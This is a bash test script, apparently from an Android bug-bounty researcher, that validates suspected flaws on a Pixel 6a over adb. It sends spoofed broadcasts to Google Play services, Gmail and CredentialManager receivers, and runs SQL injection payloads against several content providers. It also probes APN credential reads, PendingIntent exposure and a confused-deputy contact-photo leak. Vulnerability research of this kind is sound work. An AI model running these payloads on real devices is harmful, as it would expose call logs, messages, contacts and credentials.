#!/bin/bash
# COMPREHENSIVE DYNAMIC TEST SUITE — Run on Pixel 6a when device reconnects
# All findings that need dynamic validation
# Device: 26131JEGR04733, Android 17/API 37, Build CP2A.260605.012

set -e
LOGDIR="/Users/sandiyochristan/Documents/vulnerabilityRes/dynamic_evidence/session4"
mkdir -p "$LOGDIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG="$LOGDIR/comprehensive_test_${TIMESTAMP}.log"

log() {
    echo "[$(date +%H:%M:%S)] $*" | tee -a "$LOG"
}

log "=== COMPREHENSIVE DYNAMIC TEST SUITE ==="
log "Device: $(adb shell getprop ro.product.model)"
log "Build: $(adb shell getprop ro.build.display.id)"
log ""

########################################
# TEST 1: GmsExternalReceiver MOCK Actions (HIGHEST PRIORITY — NOVEL)
########################################
log "=== TEST 1: GmsExternalReceiver MOCK_NEW_OUTGOING_CALL/SMS ==="
log "Sending MOCK_NEW_OUTGOING_CALL to GmsExternalReceiver..."
adb shell am broadcast \
  -n com.google.android.gms/com.google.android.gms.chimera.GmsIntentOperationService.GmsExternalReceiver \
  -a thunderbird.intent.action.MOCK_NEW_OUTGOING_CALL \
  --es android.intent.extra.PHONE_NUMBER "+15551234567" 2>&1 | tee -a "$LOG"

sleep 2

log "Sending MOCK_NEW_OUTGOING_SMS to GmsExternalReceiver..."
adb shell am broadcast \
  -n com.google.android.gms/com.google.android.gms.chimera.GmsIntentOperationService.GmsExternalReceiver \
  -a thunderbird.intent.action.MOCK_NEW_OUTGOING_SMS \
  --es android.intent.extra.PHONE_NUMBER "+15551234567" \
  --es sms_body "Test message" 2>&1 | tee -a "$LOG"

sleep 2

log "Checking call log for MOCK call..."
adb shell content query --uri content://call_log/calls --projection "number,type,date" --sort "date DESC" --where "number='+15551234567'" 2>&1 | tee -a "$LOG"

log "Checking SMS for MOCK message..."
adb shell content query --uri content://sms --projection "address,body,type,date" --sort "date DESC" --where "address='+15551234567'" 2>&1 | tee -a "$LOG"

# Also send with common extras used by telephony
log "MOCK_NEW_OUTGOING_CALL with telephony extras..."
adb shell am broadcast \
  -n com.google.android.gms/com.google.android.gms.chimera.GmsIntentOperationService.GmsExternalReceiver \
  -a thunderbird.intent.action.MOCK_NEW_OUTGOING_CALL \
  --es android.intent.extra.PHONE_NUMBER "+15559876543" \
  --es resultData "+15559876543" 2>&1 | tee -a "$LOG"

log ""

########################################
# TEST 2: GmsExternalReceiver FRP_CONFIG_CHANGED
########################################
log "=== TEST 2: GmsExternalReceiver FRP_CONFIG_CHANGED ==="
log "Sending FRP_CONFIG_CHANGED..."
adb shell am broadcast \
  -n com.google.android.gms/com.google.android.gms.chimera.GmsIntentOperationService.GmsExternalReceiver \
  -a com.google.android.gms.auth.FRP_CONFIG_CHANGED 2>&1 | tee -a "$LOG"

log "Check FRP state after broadcast..."
adb shell settings get global device_provisioned 2>&1 | tee -a "$LOG"
adb shell settings get secure user_setup_complete 2>&1 | tee -a "$LOG"
log ""

########################################
# TEST 3: GmsExternalReceiver Other Critical Actions
########################################
log "=== TEST 3: GmsExternalReceiver Other Actions ==="

log "SETUP_WIZARD_FINISHED..."
adb shell am broadcast \
  -n com.google.android.gms/com.google.android.gms.chimera.GmsIntentOperationService.GmsExternalReceiver \
  -a com.google.android.setupwizard.SETUP_WIZARD_FINISHED 2>&1 | tee -a "$LOG"

log "INSTANT_APP_INSTALLED..."
adb shell am broadcast \
  -n com.google.android.gms/com.google.android.gms.chimera.GmsIntentOperationService.GmsExternalReceiver \
  -a com.google.android.gms.instantapps.INSTANT_APP_INSTALLED \
  --es package_name "com.attacker.malicious" 2>&1 | tee -a "$LOG"

log "LAUNCH_GAME_CONTROLS_PANEL..."
adb shell am broadcast \
  -n com.google.android.gms/com.google.android.gms.chimera.GmsIntentOperationService.GmsExternalReceiver \
  -a com.google.android.gms.gp.gamecontrols.action.LAUNCH_GAME_CONTROLS_PANEL 2>&1 | tee -a "$LOG"
log ""

########################################
# TEST 4: Google Keep SliceProvider (NOVEL)
########################################
log "=== TEST 4: Google Keep SliceProvider Access ==="
log "Testing Keep notes slice access..."
adb shell content query --uri "content://com.google.android.keep.slices/" 2>&1 | tee -a "$LOG"
adb shell content query --uri "content://com.google.android.keep.slices/?note_id=1" 2>&1 | tee -a "$LOG"

# Try calling the slice provider directly
log "Attempting SliceProvider.onBindSlice..."
adb shell "content call --uri content://com.google.android.keep.slices --method slice 2>&1" | tee -a "$LOG"
log ""

########################################
# TEST 5: Settings SliceProvider Toggle Actions
########################################
log "=== TEST 5: Settings SliceProvider ==="
SLICE_URIS=(
    "content://com.android.settings.slices/action/flashlight"
    "content://com.android.settings.slices/action/bluetooth"
    "content://android.settings.slices/action/airplane_mode"
    "content://com.android.settings.slices/action/wifi"
    "content://com.android.settings.slices/action/mobile_data"
    "content://com.android.settings.slices/action/nfc"
    "content://com.android.settings.slices/action/auto_rotate"
    "content://com.android.settings.slices/action/battery_saver"
)

for uri in "${SLICE_URIS[@]}"; do
    log "Query: $uri"
    adb shell content query --uri "\"$uri\"" 2>&1 | tee -a "$LOG"
done

# Test if we can toggle flashlight via slice
log "Attempting to toggle flashlight via slice..."
adb shell "content call --uri 'content://com.android.settings.slices/action/flashlight' --method pin 2>&1" | tee -a "$LOG"
log ""

########################################
# TEST 6: CarrierIdProvider SQL Injection
########################################
log "=== TEST 6: CarrierIdProvider SQL Injection ==="
log "Basic query (no permission check on default path)..."
adb shell content query --uri content://carrier_id 2>&1 | tee -a "$LOG"
adb shell content query --uri content://carrier_id/1 2>&1 | tee -a "$LOG"

log "SQL injection in projection..."
adb shell "content query --uri content://carrier_id --projection \"'(SELECT sql FROM sqlite_master LIMIT 1) AS x'\"" 2>&1 | tee -a "$LOG"

log "SQL injection in selection..."
adb shell "content query --uri content://carrier_id --where \"1=1) UNION SELECT sql,name,type FROM sqlite_master--\"" 2>&1 | tee -a "$LOG"
log ""

########################################
# TEST 7: TelephonyProvider Compat APN Bypass
########################################
log "=== TEST 7: TelephonyProvider ==="
log "Try reading APNs..."
adb shell content query --uri content://telephony/carriers 2>&1 | head -5 | tee -a "$LOG"
adb shell content query --uri content://telephony/carriers/current 2>&1 | tee -a "$LOG"

# Try compat mode bypass
log "Compat mode bypass..."
adb shell "content query --uri content://telephony/carriers --projection '_id,name,apn,user,password,server,proxy,port,mcc,mnc'" 2>&1 | head -10 | tee -a "$LOG"
log ""

########################################
# TEST 8: GsaPublicContentProvider (AGSA — No Permission)
########################################
log "=== TEST 8: AGSA GsaPublicContentProvider ==="
log "Basic query..."
adb shell content query --uri content://com.google.android.googlequicksearchbox.GsaPublicContentProvider 2>&1 | tee -a "$LOG"

log "Query with call method..."
adb shell content call --uri content://com.google.android.googlequicksearchbox.GsaPublicContentProvider --method query 2>&1 | tee -a "$LOG"
log ""

########################################
# TEST 9: AGSA TipsGateway Providers (No Permission)
########################################
log "=== TEST 9: AGSA TipsGateway Providers ==="
TIPS_URIS=(
    "content://com.google.android.apps.search.assistant.surfaces.voice.ui.interpreter.tips.configuration.TIPS_CONFIG_PROVIDER"
    "content://com.google.android.apps.search.assistant.verticals.ambient.smartspace.tips.configuration.TIPS_CONFIG_PROVIDER"
)
for uri in "${TIPS_URIS[@]}"; do
    log "Query: $uri"
    adb shell "content query --uri '$uri'" 2>&1 | tee -a "$LOG"
    adb shell "content call --uri '$uri' --method tips_config" 2>&1 | tee -a "$LOG"
done
log ""

########################################
# TEST 10: MediaStore/CallLog/UserDictionary SQL Injection
########################################
log "=== TEST 10: MediaStore SQL Injection ==="
log "MediaStore projection injection..."
adb shell "content query --uri content://media/external/file --projection \"'(SELECT group_concat(sql,char(10)) FROM sqlite_master WHERE type=\"table\" LIMIT 5) AS x'\" --sort 'date DESC LIMIT 1'" 2>&1 | tee -a "$LOG"

log "CallLog projection injection..."
adb shell "content query --uri content://call_log/calls --projection \"'(SELECT group_concat(name) FROM sqlite_master WHERE type=\"table\") AS x'\" --sort 'date DESC LIMIT 1'" 2>&1 | tee -a "$LOG"

log "UserDictionary projection injection..."
adb shell "content query --uri content://user_dictionary/words --projection \"'(SELECT group_concat(name) FROM sqlite_master WHERE type=\"table\") AS x'\"" 2>&1 | tee -a "$LOG"
log ""

########################################
# TEST 11: Gmail TestingToolsBroadcastReceiver
########################################
log "=== TEST 11: Gmail GrowthKit Debug Receiver ==="
log "FETCH_PROMOTIONS (leak stored promos)..."
adb shell am broadcast \
  -n com.google.android.gm/com.google.android.libraries.internal.growth.growthkit.internal.debug.TestingToolsBroadcastReceiver \
  -a com.google.android.libraries.internal.growth.growthkit.FETCH_PROMOTIONS \
  --es account "sandiyotest@gmail.com" 2>&1 | tee -a "$LOG"

log "GET_REGISTRATION_STATE (leak FCM state)..."
adb shell am broadcast \
  -n com.google.android.gm/com.google.android.libraries.internal.growth.growthkit.internal.debug.TestingToolsBroadcastReceiver \
  -a com.google.android.libraries.internal.growth.growthkit.GET_REGISTRATION_STATE \
  --es account "sandiyotest@gmail.com" 2>&1 | tee -a "$LOG"

log "SYNC (trigger forced sync)..."
adb shell am broadcast \
  -n com.google.android.gm/com.google.android.libraries.internal.growth.growthkit.internal.debug.TestingToolsBroadcastReceiver \
  -a com.google.android.libraries.internal.growth.growthkit.SYNC 2>&1 | tee -a "$LOG"
log ""

########################################
# TEST 12: CredentialManager AccountRemoved File Deletion
########################################
log "=== TEST 12: CredentialManager Fake Account Removal ==="
log "Sending fake ACCOUNT_REMOVED..."
adb shell am broadcast \
  -n com.google.android.apps.credentialmanager/com.google.android.libraries.phenotype.client.stable.AccountRemovedBroadcastReceiver \
  -a android.accounts.action.ACCOUNT_REMOVED \
  --es accountType com.google \
  --es authAccount "test_nonexistent@gmail.com" 2>&1 | tee -a "$LOG"
log ""

########################################
# TEST 13: PendingIntent Theft from Notifications
########################################
log "=== TEST 13: PendingIntent Notification Theft ==="
log "Checking active notifications..."
adb shell dumpsys notification --noredact 2>&1 | grep -E "PendingIntent|flags=|mutable|package=" | head -30 | tee -a "$LOG"
log ""

########################################
# TEST 14: Phenotype Feature Flags (Zero Permission)
########################################
log "=== TEST 14: Phenotype Feature Flags ==="
PHENO_PKGS=(
    "com.google.android.gms"
    "com.google.android.gm"
    "com.google.android.apps.photos"
    "com.google.android.apps.nbu.files"
    "com.google.android.dialer"
    "com.google.android.apps.walletnfcrel"
)
for pkg in "${PHENO_PKGS[@]}"; do
    log "Phenotype: $pkg"
    adb shell "content query --uri content://com.google.android.gms.phenotype/$pkg --projection 'flagType,name,stringVal' 2>&1" | head -5 | tee -a "$LOG"
done
log ""

log "=== ALL TESTS COMPLETE ==="
log "Log saved to: $LOG"

########################################
# TEST 15: Google Messages AvatarContentProvider Confused Deputy
# (Known VRP, reported May 2026, fixed June 12 - our build is June 5!)
########################################
log "=== TEST 15: Messages AvatarContentProvider Confused Deputy ==="
log "Testing contact photo access via AvatarContentProvider..."

# Try to read contact 1's photo via AvatarContentProvider
for CID in 1 2 3 4 5; do
    log "Trying contact $CID..."
    adb shell "content read --uri 'content://com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider/r?m=content%3A%2F%2Fcom.android.contacts%2Fcontacts%2F${CID}%2Fphoto' > /sdcard/Download/avatar_test_${CID}.png 2>&1" | tee -a "$LOG"
    adb shell "ls -la /sdcard/Download/avatar_test_${CID}.png 2>&1" | tee -a "$LOG"
done

# Also try the openFile path
log "Testing via openFile path..."
adb shell "content read --uri 'content://com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider/s?i=content%3A%2F%2Fcom.android.contacts%2Fcontacts%2F1%2Fphoto'" 2>&1 | tee -a "$LOG"
log ""
